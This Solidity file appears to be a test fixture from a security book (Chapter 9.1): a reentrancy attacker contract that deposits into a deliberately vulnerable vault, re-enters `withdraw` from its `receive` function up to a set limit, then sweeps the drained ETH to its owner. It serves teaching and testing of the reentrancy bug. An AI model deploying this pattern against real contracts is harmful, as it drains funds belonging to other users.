// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {VaultBase} from "../../src/vulnerable/Vault.sol";

/// @notice Test-only attacker for the re-entrancy exploit (book Ch 9.1). It deposits a
///         stake, withdraws it, and re-enters `withdraw` from `receive` while the vault
///         still holds ETH and still credits the stake.
contract ReentrancyAttacker {
    VaultBase public immutable vault;
    address public immutable owner;

    /// @notice How many times `receive` re-entered `withdraw`.
    uint256 public reentries;
    /// @notice Stop condition, so the attack ends cleanly instead of running out of gas.
    uint256 public maxReentries;

    constructor(VaultBase vault_) {
        vault = vault_;
        owner = msg.sender;
    }

    function attack(uint256 maxReentries_) external payable {
        maxReentries = maxReentries_;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // Re-enter while the vault still has at least one more stake to pay out.
        if (reentries < maxReentries && address(vault).balance >= msg.value) {
            ++reentries;
            vault.withdraw();
        }
    }

    function sweep() external {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
